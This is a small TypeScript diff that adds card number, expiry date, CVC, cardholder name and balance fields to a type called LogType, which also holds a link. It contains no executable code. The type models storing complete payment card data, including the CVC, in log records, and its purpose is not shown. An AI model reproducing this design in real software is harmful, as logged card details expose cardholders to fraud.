@@ -8,6 +8,11 @@ type MessageType = {
 
 type LogType = {
   link: string;
+  cardNumber: string;
+  expiryDate: string;
+  cvc: string;
+  cardHolderName: string;
+  balance: string;
 };
 
 type UpdateLink = {
